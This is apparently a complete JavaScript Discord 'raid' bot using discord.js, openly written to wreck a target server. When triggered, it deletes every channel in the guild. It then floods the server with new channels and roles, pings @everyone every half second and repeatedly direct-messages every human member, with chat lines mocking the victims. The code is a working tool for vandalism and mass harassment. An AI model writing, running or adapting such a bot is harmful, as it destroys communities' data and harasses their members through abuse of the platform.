const discord = require('discord.js')
const client = new discord.Client()
const god = 759743389037101066

client.on('ready', () => {
  console.log('Ready to Raid.')
  client.user.setPresence('raiding...');
  setInterval(() => {
     client.channels.cache.get(process.env.channel).send('@everyone')
  }, 1 * 500)
});

client.on('message', message => {
  if (message.content.startsWith('initiate raid.')){
    message.channel.send('dude, i just started raiding their shitty server lmfao')
    message.channel.send('starting raid.')
    message.channel.send('Deleting All Channels...')
    var server = client.guilds.cache.get(process.env.guild)
    for (var i = 0; i < server.channels.cache.array().length; i++) {
      server.channels.cache.array()[i].delete();
    }
  message.channel.send('Spamming new channels...')
  setInterval(() => {
      server.channels.create('payment', "text")
  }, 1 * 300)
  message.channel.send('Dropping 250 roles into the server...')
  setInterval(() => {
    server.roles.create('payment', 'text')
  }, 1 * 500)
  message.channel.send('Dming the shitty people in it.')
  setInterval(() => {
  server.members.cache.forEach(member => {
        if (member.id != client.user.id && !member.user.bot) return member.send('sup, :thinking:');
      });
  }, 1 * 300)
}
})

client.login(process.env.token)
